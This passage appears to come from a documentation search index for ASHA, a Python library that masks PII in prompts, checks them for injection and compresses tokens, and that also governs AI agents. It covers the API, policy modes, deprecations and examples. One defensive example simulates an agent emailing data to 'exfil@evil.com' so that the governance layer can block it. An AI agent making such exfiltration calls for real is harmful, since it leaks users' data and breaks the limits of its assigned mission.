PromptProcessor, Agent, adapters\n\u251c\u2500\u2500 integrations/   # wrap_llm, auto_patch, middleware\n\u251c\u2500\u2500 types/          # ProcessResult, etc.\n\u251c\u2500\u2500 utils/          # dropin functions\n\u251c\u2500\u2500 compat/         # legacy_results only\n\u2514\u2500\u2500 cli/\n</code></pre>"},{"location":"contributing/#code-style","title":"Code style","text":"<pre><code>flake8 src/asha --select=F401,F824\nmypy src/asha --ignore-missing-imports\n</code></pre> <p>Match existing conventions - minimal diffs, no drive-by refactors.</p>"},{"location":"contributing/#docs","title":"Docs","text":"<pre><code>pip install -e \".[docs]\"\nmkdocs serve\nmkdocs build --strict\n</code></pre> <p>Update docs when changing public API. Root exports are: <code>process</code>, <code>sanitize</code>, <code>optimize</code>, <code>Agent</code>, <code>anchor</code>.</p>"},{"location":"contributing/#release-track","title":"Release track","text":"<p>Current pin: <code>asha==0.4.2</code> (developer preview / production-pilot build). Breaking changes allowed in 0.x \u2014 document in <code>CHANGELOG.md</code> and <code>docs/migration-v0.4.md</code>.</p> <p>Before PRs that touch packaging or docs:</p> <pre><code>python scripts/check_public_surface.py\n</code></pre> <p>Maintainer release checklist: repository <code>maintainers/RELEASE_0.4.2.md</code>. Private detector artifacts: never commit here \u2014 see repository <code>maintainers/PRIVATE_ARTIFACTS.md</code>.</p>"},{"location":"contributing/#pull-requests","title":"Pull requests","text":"<ol> <li>Fork and branch</li> <li>Add tests for behavior changes</li> <li>Run full pytest locally</li> <li>Update relevant docs</li> <li>Open PR with clear description</li> <li>No secrets, <code>training/</code>, <code>models/</code>, or <code>*.joblib</code> in the public tree</li> </ol> <p>See status.md for preview scope.</p>"},{"location":"core-concepts/","title":"Core concepts","text":"<p>ASHA v0.4.2 \u2014 how the pieces fit together.</p> <p>ASHA preprocesses prompts (detect PII, check threats, compile structure, compress tokens) and can govern autonomous agents via ANCHOR. You call one function; engines run inside <code>PromptProcessor</code>. ANCHOR is a separate runtime path.</p>"},{"location":"core-concepts/#public-api","title":"Public API","text":""},{"location":"core-concepts/#root-package","title":"Root package","text":"<pre><code>from asha import process, sanitize, optimize, Agent, anchor\n</code></pre>"},{"location":"core-concepts/#common-subpackage-imports","title":"Common subpackage imports","text":"<pre><code>from asha.integrations import wrap_llm\nfrom asha.types import ProcessResult, SanitizeResult, OptimizeResult\nfrom asha.core.policy_config import PolicyConfig\nfrom asha.runtime import PromptProcessor\nfrom asha.utils.dropin import process_async\nfrom asha.utils.unmask import unmask\n</code></pre> <p>There is no global <code>configure()</code>. Pass <code>mode</code> and <code>policy</code> per call.</p> <p>Experimental helpers (<code>recommend_local_model</code>, smart routing, <code>AdapterFactory</code>) live under experimental-features.md.</p>"},{"location":"core-concepts/#processing-flow","title":"Processing flow","text":"<pre><code>process(prompt)\n  \u2192 resolve mode + PolicyConfig\n  \u2192 PromptProcessor.run()\n      \u2192 run_security()      # PII, injection, masking\n      \u2192 compile_prompt()    # internal representation \u2192 structured text\n      \u2192 optimize_tokens()   # token compression\n  \u2192 ProcessResult\n</code></pre> <p><code>sanitize()</code> runs security only. <code>optimize()</code> runs token compression only.</p>"},{"location":"core-concepts/#policy-modes","title":"Policy modes","text":"Mode Security Optimization On total failure <code>balanced</code> Standard Yes Fail-open + fallback <code>strict</code> Maximum Yes Raises <code>ASHAProcessingError</code> <code>lite</code> Minimal features Reduced Fail-open (same as balanced) <code>off</code> Skipped Skipped Passthrough <pre><code>process(\"prompt\", mode=\"balanced\")  # default\nprocess(\"prompt\", mode=\"strict\")\nprocess(\"prompt\", mode=\"off\")\n</code></pre>"},{"location":"core-concepts/#policyconfig","title":"PolicyConfig","text":"<p>Advanced knobs are not top-level kwargs on <code>process()</code>:</p> <pre><code>from asha.core.policy_config import PolicyConfig\n\nprocess(\n    prompt,\n    policy=PolicyConfig(\n        pii_mode=\"rule\",       # hybrid (default) | rule | lite | ml_only\n        reversible=False,\n        preserve_intent=False,\n        security_level=\"medium\",\n    ),\n)\n</code></pre> Field Purpose <code>pii_mode</code> Detection strategy (default <code>\"hybrid\"</code>; soft-falls back without ML) <code>reversible</code> Store masking map for <code>unmask()</code> <code>preserve_intent</code> Skip optimization when no PII/threats <code>security_level</code> <code>low</code> / <code>medium</code> / <code>high</code>"},{"location":"core-concepts/#result-types","title":"Result types","text":""},{"location":"core-concepts/#processresult","title":"ProcessResult","text":"<pre><code>result = process(\"prompt\")\nresult.output          # processed text\nresult.original        # input text\nresult.degraded        # True if fallback path used\nresult.security        # SecurityInfo (PII, threats)\nresult.metrics         # tokens, timing\nresult.trace           # when trace=True\nresult.diff            # when debug=True\nstr(result)            # same as result.output\n</code></pre>"},{"location":"core-concepts/#sanitizeresult-optimizeresult","title":"SanitizeResult / OptimizeResult","text":"<p>Same pattern \u2014 <code>.output</code>, <code>.security</code> (sanitize), <code>.metrics</code> (optimize).</p> <p>Legacy dict: <code>result.to_dict()</code> or <code>asha.compat.legacy_results.to_legacy_pipeline_dict(result)</code>.</p>"},{"location":"core-concepts/#fail-open-vs-fail-closed","title":"Fail-open vs fail-closed","text":"API Default Strict <code>process()</code> / <code>sanitize()</code> Fail-open fallback <code>mode=\"strict\"</code> raises <code>wrap_llm()</code> Uses caller <code>mode</code> Transport errors raise when <code>mode != \"off\"</code> <code>auto_patch()</code> Default <code>mode=\"strict\"</code> Configurable"},{"location":"core-concepts/#reversible-masking","title":"Reversible masking","text":"<pre><code>from asha import sanitize\nfrom asha.core.policy_config import PolicyConfig\nfrom asha.utils.unmask import unmask\n\nresult = sanitize(\n    \"Email alice@corp.com\",\n    policy=PolicyConfig(reversible=True),\n)\nsafe = result.output\nrestored = unmask(safe, result.security.masking_map)\n</code></pre>"},{"location":"core-concepts/#agent-vs-drop-in-vs-anchor","title":"Agent vs drop-in vs ANCHOR","text":"Goal Use Preprocess only <code>process()</code>, <code>sanitize()</code>, <code>optimize()</code> Wrap existing SDK <code>wrap_llm(client)</code> Preprocess + LLM call <code>Agent(model=...)</code> Govern autonomous agents <code>anchor(agent)</code> / framework adapters Task-based model pick <code>Agent(routing_config=...)</code> \u2014 experimental Local model advice <code>recommend_local_model()</code> \u2014 experimental <p><code>Agent(privacy=True)</code> enables preprocessing with strict internal mode. <code>privacy=False</code> disables it.</p>"},{"location":"core-concepts/#internal-vs-public","title":"Internal vs public","text":"<p>Public: <code>process</code>, modes, typed results, <code>anchor</code>, documented integrations.</p> <p>Internal (do not import in app code): <code>core/_ir/</code>, compiler internals, detector calibration artifacts.</p>"},{"location":"core-concepts/#related","title":"Related","text":"<ul> <li>Architecture</li> <li>API reference</li> <li>Status</li> <li>Experimental features</li> </ul>"},{"location":"debugging/","title":"Debugging","text":"<p>How to inspect what ASHA did to a prompt using traces and diffs.</p>"},{"location":"debugging/#trace-a-process-call","title":"Trace a process() call","text":"<pre><code>from asha import process\n\nresult = process(\n    \"Analyze data with john@example.com\",\n    trace=True,\n    debug=True,\n)\n\nprint(result.output)\nprint(result.trace)\nprint(result.diff)\n</code></pre> <p><code>trace=True</code> records stage names, timing, and intermediate outputs. <code>debug=True</code> adds <code>result.diff</code> (unified diff) and optional debug metadata.</p> <pre><code>result = process(\"prompt\", debug=True)\nif result.degraded:\n    print(result.degraded_reason)\nprint(result.diff)\n</code></pre>"},{"location":"debugging/#agent-tracing","title":"Agent tracing","text":"<pre><code>from asha import Agent\n\nagent = Agent(model=\"mock\")\nresult = agent.run(\"prompt with john@x.com\", trace=True)\nprint(result.output)\nprint(result.response)\nprint(result.adapter_info)\n</code></pre> <p>Without <code>trace=True</code>, <code>agent.run()</code> returns a string only.</p>"},{"location":"debugging/#cli","title":"CLI","text":"<pre><code>asha \"prompt with john@x.com\" --debug --mode balanced\n</code></pre>"},{"location":"debugging/#removed-apis","title":"Removed APIs","text":"<p><code>ASHADebugger</code>, <code>DebugTracer</code>, and the old <code>debug/</code> package were removed in v0.4.1. Use <code>trace=True</code> / <code>debug=True</code> on <code>process()</code> instead.</p>"},{"location":"debugging/#related","title":"Related","text":"<ul> <li>Architecture</li> <li>API reference</li> <li>Troubleshooting</li> </ul>"},{"location":"deprecations/","title":"Shim deprecation and removal policy","text":"<p>ASHA v0.4.1 completes the architecture redesign. Removed symbols raise <code>AttributeError</code> - there are no root lazy imports.</p>"},{"location":"deprecations/#removed-in-v041","title":"Removed in v0.4.1","text":"Removed Use instead <code>from asha import wrap_llm</code> <code>from asha.integrations import wrap_llm</code> <code>from asha import auto_patch</code> <code>from asha.integrations import auto_patch</code> <code>from asha import Processor</code> <code>from asha.runtime import PromptProcessor</code> <code>from asha import Pipeline</code> <code>process()</code> or <code>to_legacy_pipeline_dict()</code> <code>from asha import ProcessResult</code> <code>from asha.types import ProcessResult</code> <code>security_fail_closed=</code> <code>mode=\"strict\"</code> or <code>mode=\"balanced\"</code> <code>privacy=</code>, <code>security=</code>, <code>compile=</code>, <code>optimize=</code> kwargs on <code>process()</code> <code>mode=</code> or <code>policy=PolicyConfig(...)</code> <code>ProcessResult.to_legacy_pipeline_dict()</code> <code>asha.compat.legacy_results.to_legacy_pipeline_dict</code>"},{"location":"deprecations/#removed-modules-v041-cleanup","title":"Removed modules (v0.4.1 cleanup)","text":"<p>Legacy pipeline-era code removed from <code>src/</code>:</p> Removed Replacement <code>core/risk_analyzer.py</code> Security via <code>core/security/service.py</code> <code>core/semantic_optimizer.py</code> <code>optimize()</code> / MSDPC in <code>core/compiler/</code> <code>core/explainability.py</code> <code>ProcessResult</code> fields + <code>trace=True</code> <code>core/debug_trace.py</code> <code>core/trace_context.py</code> <code>core/diff_engine.py</code> <code>TraceContext.generate_diff()</code> <code>core/latency_budget.py</code> <code>timeout_seconds</code> on <code>process()</code> <code>core/modes.py</code> <code>PolicyMode</code> in <code>core/policy_config.py</code> <code>core/config.py</code> <code>mode</code> + <code>PolicyConfig</code> per call <code>debug/</code> package <code>trace=True</code> / <code>debug=True</code> on <code>process()</code> <code>runtime/router.py</code> <code>Agent(routing_config=...)</code> <code>runtime/routing/model_router.py</code> <code>SmartRoutingAdapter</code> in adapters"},{"location":"deprecations/#public-api-v042","title":"Public API (v0.4.2)","text":"<p>Root exports only:</p> <pre><code>from asha import process, sanitize, optimize, Agent, anchor\n</code></pre> <p>Advanced:</p> <pre><code>from asha.runtime import PromptProcessor, ExecutionProfile\nfrom asha.integrations import wrap_llm, auto_patch\nfrom asha.types import ProcessResult, SanitizeResult\nfrom asha.core.policy_config import PolicyConfig\n</code></pre> <p>Legacy dict shapes (opt-in):</p> <pre><code>from asha.compat.legacy_results import to_legacy_pipeline_dict\n\nresult = process(\"prompt\", include_legacy_detail=True)\nlegacy = to_legacy_pipeline_dict(result)\n</code></pre>"},{"location":"deprecations/#architecture","title":"Architecture","text":"<pre><code>asha/\n\u251c\u2500\u2500 core/          # engines, policy, security, compiler, _ir (internal)\n\u251c\u2500\u2500 runtime/       # PromptProcessor, resolve, Agent, adapters\n\u251c\u2500\u2500 integrations/  # wrap_llm, auto_patch, framework middleware\n\u251c\u2500\u2500 compat/        # legacy_results only (opt-in dict conversion)\n\u251c\u2500\u2500 types/         # ProcessResult, SanitizeResult\n\u251c\u2500\u2500 utils/         # dropin (process/sanitize/optimize)\n\u251c\u2500\u2500 cli/           # asha CLI (ancillary)\n\u2514\u2500\u2500 __init__.py    # 5 exports only\n</code></pre> <p>Layer boundaries:</p> <ul> <li><code>core/</code> must not import <code>runtime</code>, <code>integrations</code>, or <code>compat</code></li> <li><code>runtime/</code> must not import <code>integrations</code> or <code>compat</code></li> <li><code>types/</code> and <code>utils/</code> must not import <code>compat</code></li> <li><code>integrations/</code> may import <code>runtime</code> and <code>core</code></li> <li><code>compat/</code> may import anything (legacy dict helpers only)</li> </ul>"},{"location":"deprecations/#policy-configuration","title":"Policy configuration","text":"<p>Most callers only need <code>mode</code>:</p> <pre><code>process(prompt, mode=\"balanced\")\nprocess(prompt, mode=\"strict\")\n</code></pre> <p>Advanced knobs via <code>PolicyConfig</code>:</p> <pre><code>from asha.core.policy_config import PolicyConfig\n\nprocess(\n    prompt,\n    policy=PolicyConfig(pii_mode=\"hybrid\", reversible=True, preserve_intent=True),\n)\n</code></pre>"},{"location":"deprecations/#safety-semantics","title":"Safety semantics","text":"Mode <code>process()</code> / <code>sanitize()</code> Integrations (<code>mode != \"off\"</code>) <code>strict</code> Raises on total failure Processing strict; transport errors raise <code>balanced</code> / <code>lite</code> Degraded fallback Processing balanced; transport errors raise <code>off</code> Passthrough No processing; transport errors propagate <p><code>auto_patch(mode=\"strict\")</code> defaults to strict for global SDK patching.</p>"},{"location":"examples/","title":"Examples","text":"<p>ASHA v0.4.2 \u2014 copy-paste patterns with valid imports.</p>"},{"location":"examples/#basic-processing","title":"Basic processing","text":"<pre><code>from asha import process\n\nresult = process(\"My email is john@example.com. Analyze this dataset.\")\nprint(result)                          # str \u2192 optimized output\nprint(result.security.pii_detected)\nprint(result.metrics.token_reduction_pct)\n</code></pre>"},{"location":"examples/#strict-mode-regulated-workloads","title":"Strict mode (regulated workloads)","text":"<pre><code>from asha import process\n\nresult = process(\"Sensitive prompt with PII\", mode=\"strict\")\n</code></pre> <p>Raises <code>ASHAProcessingError</code> on total failure instead of degraded fallback.</p>"},{"location":"examples/#wrap-openai-client","title":"Wrap OpenAI client","text":"<pre><code>import os\nfrom asha.integrations import wrap_llm\nimport openai\n\nos.environ[\"OPENAI_API_KEY\"] = \"your-key\"\nclient = wrap_llm(openai.OpenAI(), mode=\"balanced\")\n\nresponse = client.chat.completions.create(\n    model=\"gpt-4o-mini\",\n    messages=[{\"role\": \"user\", \"content\": \"Data from john@example.com\"}],\n)\n</code></pre>"},{"location":"examples/#security-only","title":"Security only","text":"<pre><code>from asha import sanitize\nfrom asha.core.policy_config import PolicyConfig\n\nresult = sanitize(\n    \"Contact john@corp.com\",\n    policy=PolicyConfig(reversible=True),\n)\nprint(result.output)\nprint(result.security.masking_map)\n</code></pre>"},{"location":"examples/#optimize-only","title":"Optimize only","text":"<pre><code>from asha import optimize\n\nresult = optimize(\"Hey bro can you please analyze this dataset\")\nprint(result.output)\n</code></pre>"},{"location":"examples/#hybrid-pii","title":"Hybrid PII","text":"<pre><code>from asha import process\nfrom asha.core.policy_config import PolicyConfig\n\nresult = process(\n    \"Contact john@example.com\",\n    policy=PolicyConfig(pii_mode=\"hybrid\"),\n)\n</code></pre> <p>Full NER requires <code>pip install asha-ai[ml]</code>; without ML deps, hybrid soft-falls back.</p>"},{"location":"examples/#agent-with-mock-no-api-key","title":"Agent with mock (no API key)","text":"<pre><code>from asha import Agent\n\nagent = Agent(model=\"mock\", privacy=True)\nprint(agent.run(\"Summarize sales data from john@example.com\"))\n</code></pre>"},{"location":"examples/#agent-with-tracing","title":"Agent with tracing","text":"<pre><code>from asha import Agent\n\nagent = Agent(model=\"mock\")\nresult = agent.run(\"prompt\", trace=True)\nprint(result.output)\nprint(result.response)\n</code></pre>"},{"location":"examples/#anchor-governance","title":"ANCHOR governance","text":"<pre><code>from asha import Agent, anchor\nfrom asha.runtime.anchor import AnchorRuntime\nfrom asha.exceptions import ASHAAnchorBlocked\n\nagent = anchor(\n    Agent(provider=\"mock\", model=\"mock\", tools=[\"read_file\", \"email\"]),\n    interactive=False,\n)\nprint(agent.run(\"Generate the monthly sales report\"))\n\nruntime = AnchorRuntime(warn_policy=\"strict\", interactive=False, risk_tolerance=\"LOW\")\nruntime.initialize_mission(\n    \"Analyze Q1 sales locally and write a report. Do not send data externally.\",\n    context={\n        \"available_tools\": [\"write_report\", \"send_email\"],\n        \"local_only\": True,\n    },\n)\ntry:\n    runtime.evaluate_action_request(\n        \"tool_call\",\n        {\n            \"tool_name\": \"send_email\",\n            \"arguments\": str({\"args\": (), \"kwargs\": {\"to\": \"exfil@evil.com\"}}),\n        },\n        raise_on_block=True,\n    )\nexcept ASHAAnchorBlocked as err:\n    print(err)\n</code></pre>"},{"location":"examples/#smart-routing-experimental","title":"Smart routing (experimental)","text":"<pre><code>from asha import Agent\n\nagent = Agent(\n    model=\"gpt-4o-mini\",\n    routing_config={\n        \"chat\": \"gpt-4o-mini\",\n        \"analysis\": \"gpt-4o\",\n    },\n)\nagent.run(\"Analyze Q1 revenue\", task_type=\"analysis\")\n</code></pre> <p>See experimental-features.md.</p>"},{"location":"examples/#async","title":"Async","text":"<pre><code>import asyncio\nfrom asha.utils.dropin import process_async\n\nasync def main():\n    result = await process_async(\"prompt\", mode=\"balanced\")\n    print(result.output)\n\nasyncio.run(main())\n</code></pre>"},{"location":"examples/#trace-and-diff","title":"Trace and diff","text":"<pre><code>from asha import process\n\nresult = process(\"john@x.com - analyze\", trace=True, debug=True)\nprint(result.trace)\nprint(result.diff)\n</code></pre>"},{"location":"examples/#local-model-advisor-experimental","title":"Local model advisor (experimental)","text":"<pre><code>from asha.runtime.local_advisor.advisor import recommend_local_model\n\nreport = recommend_local_model(\n    prompts=[\"Summarize with john@x.com\"],\n    mode=\"balanced\",\n    top=3,\n)\nprint(report.top_pick)\n</code></pre> <p>Requires <code>pip install asha-ai[local-advisor]</code>. See experimental-features.md.</p>"},{"location":"examples/#interactive-demo-streamlit","title":"Interactive demo (Streamlit)","text":"<p>All runnable demos are in the Streamlit showcase:</p> <pre><code>pip install -e \".[demo]\"\nstreamlit run examples/showcase/streamlit_app.py\n</code></pre> <p>Covers security console, ANCHOR mission control, document scrubber, live LLM, playground, architecture, and benchmarks \u2014 using the same APIs as the snippets above.</p> <p>Details: <code>examples/showcase/README.md</code>.</p>"},{"location":"examples/#related","title":"Related","text":"<ul> <li>API reference</li> <li>Tutorial</li> <li>Status</li> <li>ANCHOR</li> </ul>"},{"location":"experimental-features/","title":"Experimental features","text":"<p>Experimental \u2014 API may change</p> <p>Everything on this page is experimental in ASHA v0.4.2. Expect breaking changes before 1.0 without a long deprecation cycle. Prefer the stable drop-in API (<code>process</code>, <code>sanitize</code>, <code>optimize</code>, <code>wrap_llm</code>). Install with <code>pip install asha-ai</code>. See status.md.</p> <p>Calling these APIs emits <code>ASHAExperimentalWarning</code> at runtime.</p>"},{"location":"experimental-features/#ashafit-local-advisor","title":"AshaFit / local advisor","text":"<p>Experimental \u2014 API may change</p> <p><code>recommend_local_model</code> and <code>Agent(local_model=...)</code> are preview APIs.</p> <p>Recommends local LLMs for a prompt workload and hardware profile.</p> <pre><code>pip install asha-ai[local-advisor]\npip install asha-ai[local-advisor-gpu]   # optional NVIDIA VRAM detection\n</code></pre> <pre><code>from asha.runtime.local_advisor.advisor import recommend_local_model\n\nreport = recommend_local_model(\n    prompts=[\n        \"My email is john@company.com - analyze this dataset.\",\n        \"Write a Python function to validate API keys.\",\n    ],\n    mode=\"strict\",\n    top=3,\n)\n\nprint(report.top_pick.model_id)\nprint(report.top_pick.ollama_pull_name)\n</code></pre> <p>CLI:</p> <pre><code>asha recommend --prompt \"Analyze dataset\" --gpu \"RTX 4090\"\nasha recommend --prompts ./benchmarks/sample_prompts.json --top 3\n</code></pre>"},{"location":"experimental-features/#agent-integration","title":"Agent integration","text":"<pre><code>from asha import Agent\n\nagent = Agent(\n    model=\"llama3\",\n    local_model=\"auto\",\n    sample_prompts=[\"Summarize this report.\"],\n)\n</code></pre>"},{"location":"experimental-features/#wrap_llm-local-selection","title":"wrap_llm + local selection","text":"<pre><code>from asha.integrations import wrap_llm\n\nclient = wrap_llm(\n    ollama_client,\n    auto_select_local_model=True,\n    sample_prompts=[\"Your typical app prompts...\"],\n)\n</code></pre> <p>Scoring combines hardware fit, workload fit, privacy requirements, and estimated speed. Exact weights and catalog contents may change.</p>"},{"location":"experimental-features/#smart-routing-smartroutingadapter","title":"Smart routing (<code>SmartRoutingAdapter</code>)","text":"<p>Experimental \u2014 API may change</p> <p>Task-based routing via <code>routing_config</code> is experimental. The standalone <code>ModelRouter</code> class was removed in v0.4.1.</p> <pre><code>from asha import Agent\n\nagent = Agent(\n    routing_config={\n        \"chat\": \"gpt-4o-mini\",\n        \"analysis\": \"gpt-4o\",\n        \"code\": \"gpt-4o\",\n    },\n)\n\nresponse = agent.run(\"Analyze Q1 revenue\", task_type=\"analysis\")\n</code></pre> <p><code>task_type</code> selects which entry in <code>routing_config</code> to use.</p>"},{"location":"experimental-features/#fallback-providers","title":"Fallback providers","text":"<pre><code>agent = Agent(\n    model=\"gpt-4o-mini\",\n    fallback_providers=[\n        {\"provider\": \"anthropic\", \"model\": \"claude-3-haiku-20240307\"},\n        {\"provider\": \"ollama\", \"model\": \"llama3\"},\n    ],\n)\n\n# Prefer explicit fallback when you need it:\n# agent.run_with_fallback(\"prompt\")\n</code></pre>"},{"location":"experimental-features/#provider-auto-detection","title":"Provider auto-detection","text":"<p>When <code>provider</code> is omitted, <code>Agent</code> infers from the model name (<code>gpt-*</code> \u2192 openai, <code>claude-*</code> \u2192 anthropic, and similar patterns). Treat this heuristics table as best-effort.</p>"},{"location":"experimental-features/#model-gateway","title":"Model gateway","text":"<p>Experimental \u2014 API may change</p> <p>Advanced adapter construction and gateway-style options beyond basic <code>wrap_llm</code> / <code>Agent</code> usage are experimental.</p>"},{"location":"experimental-features/#wrap_llm-recommended-entry","title":"wrap_llm (recommended entry)","text":"<pre><code>from asha.integrations import wrap_llm\nimport openai\n\nclient = wrap_llm(openai.OpenAI(), mode=\"balanced\")\n\nresponse = client.chat.completions.create(\n    model=\"gpt-4o-mini\",\n    messages=[{\"role\": \"user\", \"content\": \"Data from john@example.com\"}],\n)\n</code></pre> <p>Import from <code>asha.integrations</code>, not the package root.</p>"},{"location":"experimental-features/#providers","title":"Providers","text":"Provider Extra Env var OpenAI <code>asha-ai[openai]</code> <code>OPENAI_API_KEY</code> Anthropic <code>asha-ai[anthropic]</code> <code>ANTHROPIC_API_KEY</code> Gemini <code>asha-ai[gemini]</code> <code>GOOGLE_API_KEY</code> Grok \u2014 <code>GROK_API_KEY</code> Ollama \u2014 local server HuggingFace <code>asha-ai[transformers]</code> \u2014 Mock \u2014 testing only"},{"location":"experimental-features/#agent","title":"Agent","text":"<pre><code>from asha import Agent\n\nagent = Agent(model=\"gpt-4o-mini\", privacy=True)\nresponse = agent.run(\"Analyze Q1 sales\")\n\n# No API key:\nagent = Agent(model=\"mock\")\n</code></pre>"},{"location":"experimental-features/#adapterfactory","title":"AdapterFactory","text":"<pre><code>from asha.runtime.adapters.factory import AdapterFactory\n\nadapter = AdapterFactory.create(provider=\"openai\", model=\"gpt-4o-mini\")\nadapter = AdapterFactory.create(provider=\"mock\")\n</code></pre>"},{"location":"experimental-features/#auto_patch","title":"auto_patch","text":"<p>Global SDK monkey-patching. Prefer <code>wrap_llm()</code> for new code.</p> <pre><code>from asha.integrations import auto_patch\n\nauto_patch(mode=\"balanced\")\n</code></pre>"},{"location":"experimental-features/#related","title":"Related","text":"<ul> <li>Status</li> <li>Tutorial</li> <li>API reference</li> <li>Integrations</li> </ul>"},{"location":"faq/","title":"FAQ","text":"<p>ASHA v0.4.2</p>"},{"location":"faq/#general","title":"General","text":""},{"location":"faq/#what-is-asha","title":"What is ASHA?","text":"<p>A Python library for mission-aware agent governance (<code>anchor</code>) and drop-in prompt security (<code>process</code> / <code>wrap_llm</code>): mask PII, check injection patterns, and compress tokens before prompts reach a model.</p>"},{"location":"faq/#is-it-production-ready","title":"Is it production-ready?","text":"<p>Developer preview. Install with <code>pip install asha-ai</code> for everyday use. For production pilots, pin the version you tested (e.g. <code>asha==0.4.2</code>) and monitor. A semver-stable 1.0 API guarantee is not claimed yet. Read status.md.</p>"},{"location":"faq/#python-version","title":"Python version?","text":"<p>3.10+ (3.10, 3.11, 3.12 in CI).</p>"},{"location":"faq/#api","title":"API","text":""},{"location":"faq/#what-can-i-import-from-the-root","title":"What can I import from the root?","text":"<pre><code>from asha import process, sanitize, optimize, Agent, anchor\n</code></pre> <p>Nothing else \u2014 no <code>wrap_llm</code>, <code>Pipeline</code>, or <code>Processor</code> at root.</p>"},{"location":"faq/#where-is-wrap_llm","title":"Where is wrap_llm?","text":"<pre><code>from asha.integrations import wrap_llm\n</code></pre>"},{"location":"faq/#what-does-process-return","title":"What does process() return?","text":"<p>A <code>ProcessResult</code> dataclass. <code>str(result)</code> returns <code>result.output</code>.</p>"},{"location":"faq/#does-process-raise","title":"Does process() raise?","text":"<ul> <li><code>mode=\"balanced\"</code> (default): fail-open \u2014 degraded fallback, <code>result.degraded=True</code></li> <li><code>mode=\"strict\"</code>: raises <code>ASHAProcessingError</code> on total failure</li> </ul>"},{"location":"faq/#how-do-i-get-metrics","title":"How do I get metrics?","text":"<pre><code>result = process(\"prompt\")\nprint(result.metrics.token_reduction_pct)\nprint(result.security.pii_detected)\n</code></pre> <p>No <code>return_metrics=True</code> \u2014 use typed fields.</p>"},{"location":"faq/#how-do-i-set-pii_mode-or-reversible","title":"How do I set pii_mode or reversible?","text":"<pre><code>from asha.core.policy_config import PolicyConfig\nprocess(prompt, policy=PolicyConfig(pii_mode=\"hybrid\", reversible=True))\n</code></pre> <p>Top-level <code>pii_mode=</code> on <code>process()</code> raises <code>TypeError</code>. Default <code>pii_mode</code> is <code>\"hybrid\"</code> (soft-falls back without ML deps).</p>"},{"location":"faq/#modes","title":"Modes","text":"Mode Description <code>balanced</code> Default \u2014 security + optimization <code>strict</code> Fail-closed <code>lite</code> Minimal policy features <code>off</code> Passthrough"},{"location":"faq/#performance","title":"Performance","text":""},{"location":"faq/#token-reduction","title":"Token reduction?","text":"<p>Depends on the prompt. Short prompts may see little or negative reported reduction after compile restructuring. Measure with performance.md.</p>"},{"location":"faq/#speed","title":"Speed?","text":"<p>Rule-based installs are typically tens of milliseconds on ordinary prompts; ML paths are slower. Use <code>mode=\"lite\"</code> or <code>mode=\"off\"</code> for lower latency. Re-run the benchmark harness on your hardware.</p>"},{"location":"faq/#security","title":"Security","text":""},{"location":"faq/#does-process-mask-pii-in-attached-documents","title":"Does process() mask PII in attached documents?","text":"<p>Yes when ASHA can read the file: pass a path/bytes to <code>sanitize</code> / <code>process</code>, or use <code>wrap_llm</code> so local attachments are extracted and masked before the LLM call. Scanned/image-only PDFs need OCR (not included). Provider-only <code>file_id</code> uploads without local bytes are not readable \u2014 see security.md.</p>"},{"location":"faq/#what-pii-is-detected","title":"What PII is detected?","text":"<p>Emails, phones, SSNs, credit cards, API keys, JWTs, IPs, and more. See security.md.</p>"},{"location":"faq/#gdpr-compliant","title":"GDPR compliant?","text":"<p>ASHA is privacy tooling, not a certified compliance product. See compliance.md.</p>"},{"location":"faq/#agent-anchor","title":"Agent / ANCHOR","text":""},{"location":"faq/#agentrun-return-type","title":"Agent.run() return type?","text":"<p>String by default. <code>AgentResult</code> when <code>trace=True</code>.</p>"},{"location":"faq/#how-do-i-govern-an-agent","title":"How do I govern an agent?","text":"<pre><code>from asha import Agent, anchor\n\nagent = anchor(Agent(provider=\"mock\", model=\"mock\"), interactive=False)\n</code></pre> <p>See anchor.md and tutorial.md.</p>"},{"location":"faq/#is-the-anchor-sandbox-a-real-container","title":"Is the ANCHOR sandbox a real container?","text":"<p>No. <code>isolation=\"auto\"</code> uses in-process hooks; <code>isolation=\"hard\"</code> uses a subprocess. Docker/bubblewrap are not implemented yet (see status.md).</p>"},{"location":"faq/#community","title":"Community","text":""},{"location":"faq/#where-do-i-ask-questions","title":"Where do I ask questions?","text":"<p>GitHub Discussions (primary) or ASHA Slack for optional chat.</p>"},{"location":"faq/#how-do-hardened-models-download","title":"How do hardened models download?","text":"<p><code>pip install asha-ai[hardened]</code> auto-fetches <code>https://github.com/AjayRajan05/ASHA/releases/download/asha-models-0.4.2/asha-models-0.4.2.zip</code> on first use. Override with <code>ASHA_MODELS_DIR</code> / <code>ASHA_MODELS_ZIP</code> / <code>ASHA_DISABLE_MODEL_DOWNLOAD=1</code>.</p>"},{"location":"faq/#removed-in-v041","title":"Removed in v0.4.1","text":"Removed Use instead <code>Pipeline</code>, <code>Processor</code> <code>process()</code> or <code>PromptProcessor</code> Root <code>wrap_llm</code> <code>asha.integrations.wrap_llm</code> <code>security_fail_closed=</code> <code>mode=\"strict\"</code> <code>return_metrics=True</code> <code>result.metrics</code> <code>ModelRouter</code> <code>Agent(routing_config=...)</code> (experimental) <p>Full list: deprecations.md.</p>"},{"location":"faq/#related","title":"Related","text":"<ul> <li>Tutorial</li> <li>Troubleshooting</li> <li>Migration v0.4</li> <li>Status</li> </ul>"},{"location":"integrations/","title":"Integrations","text":"<p>How to wrap LLM clients and attach ASHA middleware to common frameworks.</p>"},{"location":"integrations/#wrap-an-llm-client","title":"Wrap an LLM client","text":"<pre><code>from asha.integrations import wrap_llm\nimport openai\n\nclient = wrap_llm(openai.OpenAI(), mode=\"balanced\")\n</code></pre> <p>Import from <code>asha.integrations</code>, not the package root.</p> Parameter Default Notes <code>mode</code> <code>balanced</code> <code>strict</code>, <code>lite</code>, <code>off</code> <code>token_budget</code> <code>1200</code> Passed to internal <code>process()</code> <p>Advanced / experimental options (<code>auto_select_local_model</code>, smart routing): experimental-features.md.</p>"},{"location":"integrations/#auto_patch-use-with-caution","title":"auto_patch (use with caution)","text":"<pre><code>from asha.integrations import auto_patch, disable_auto_patch\n\nauto_patch(mode=\"strict\")\n# ... application code ...\ndisable_auto_patch()\n</code></pre> <p>Globally monkey-patches SDKs. Prefer per-client <code>wrap_llm()</code> in production.</p>"},{"location":"integrations/#framework-middleware","title":"Framework middleware","text":"<pre><code>pip install asha-ai[integrations]\n# or specific: asha-ai[fastapi], asha-ai[langchain], etc.\n</code></pre> Framework Module FastAPI <code>asha.integrations.fastapi</code> Flask <code>asha.integrations.flask</code> Django <code>asha.integrations.django</code> LangChain <code>asha.integrations.langchain</code> LlamaIndex <code>asha.integrations.llamaindex</code> Instructor <code>asha.integrations.composition_strategy</code> OpenTelemetry 